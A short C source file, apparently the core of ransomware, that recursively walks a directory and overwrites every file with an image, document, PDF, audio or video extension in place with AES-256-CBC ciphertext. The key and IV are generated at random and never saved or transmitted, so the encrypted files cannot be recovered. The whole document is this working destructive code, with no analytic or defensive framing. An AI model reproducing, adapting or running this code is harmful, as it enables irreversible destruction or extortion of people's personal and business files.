#include <stdlib.h>
#include <string.h>
#include <ftw.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>

char *const extensions[] = {".jpg", ".gif", ".jpeg", ".png", ".doc", ".docx", ".xls",
      ".xlsx", ".ppt", ".pptx", ".mp3", ".mp4", ".pdf"};
const int extensionsSize = 13;
const int descriptors = 10;
#define BLOCK_SIZE 16
#define KEY_SIZE 32

struct enc_status {
	unsigned char plaintext[BLOCK_SIZE];
	unsigned char ciphertext[BLOCK_SIZE];
	unsigned char key[KEY_SIZE];
	unsigned char iv[BLOCK_SIZE];
	EVP_CIPHER_CTX *ctx;
};

static struct enc_status status;

void handleErrors(int error) {
	if (!error) {
		ERR_print_errors_fp(stderr);
		exit(EXIT_FAILURE);
	}
}

void encryptFile(const char *name) {
	FILE *inFile, *outFile;
	int len;

	handleErrors(status.ctx = EVP_CIPHER_CTX_new());
	handleErrors(EVP_EncryptInit_ex(status.ctx, EVP_aes_256_cbc(), NULL, status.key, status.iv));
	inFile = fopen(name, "rb+");
	outFile = tmpfile();

	while (!feof(inFile)) {
		len = fread(status.plaintext, 1, BLOCK_SIZE, inFile);
		EVP_EncryptUpdate(status.ctx, status.ciphertext, &len, status.plaintext, len);

		fwrite(status.ciphertext, 1, len, outFile);
	}

	handleErrors(EVP_EncryptFinal_ex(status.ctx, status.ciphertext, &len));
	fwrite(status.ciphertext, 1, len, outFile);
	inFile = freopen(NULL, "wb", inFile);
	rewind(outFile);

	while(!feof(outFile)) {
		len = fread(status.ciphertext, 1, BLOCK_SIZE, outFile);
		fwrite(status.ciphertext, 1, len, inFile);
	}

	fclose(inFile);
	fclose(outFile);
	EVP_CIPHER_CTX_free(status.ctx);
}

int shouldEncrypt(const char *name, const struct stat *stats, int flag, struct FTW *path) {
	char *extension = strrchr(name + path->base, '.');

	if (extension) {
		for (int i = 0; i < extensionsSize; i++) {
			if (strcmp(extension, extensions[i]) == 0 && flag == FTW_F) {
				encryptFile(name);
				return 0;
			}
		}
	}

	return 0;
}

int encryptFiles(const char *dir) {
	handleErrors(RAND_bytes(status.key, KEY_SIZE));
	handleErrors(RAND_bytes(status.iv, BLOCK_SIZE));

	return nftw(dir, shouldEncrypt, descriptors, 0);
}
